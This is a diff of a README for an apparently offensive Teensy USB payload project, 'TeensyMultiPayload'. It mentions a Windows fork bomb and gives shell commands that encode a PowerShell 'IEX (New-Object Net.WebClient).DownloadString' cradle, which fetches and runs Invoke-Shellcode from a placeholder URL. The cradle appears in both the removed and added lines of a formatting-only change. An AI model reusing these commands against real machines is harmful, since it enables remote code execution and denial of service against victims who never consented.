@@ -10,8 +10,8 @@ The fork bomb is all set and should work on all windows computers XP and up.
 To generate the Invoke-Shellcode encoded command for PowerShell, modify and execute the below commands on Linux or Cygwin then replace READ_README in TeensyMultiPayload with the output.
 For more information on Invoke-Shellcode see: https://github.com/PowerShellMafia/PowerSploit
 
-``
-scriptblock="IEX (New-Object Net.WebClient).DownloadString(‘Change_To_Your_InvokeShellcode_URL’);"
-encode="`echo $scriptblock | iconv --to-code UTF-16LE | base64 -w 0`"
-echo $encode
-``
+``scriptblock="IEX (New-Object Net.WebClient).DownloadString(‘Change_To_Your_InvokeShellcode_URL’);"``
+
+``encode="`echo $scriptblock | iconv --to-code UTF-16LE | base64 -w 0`"``
+
+``echo $encode``
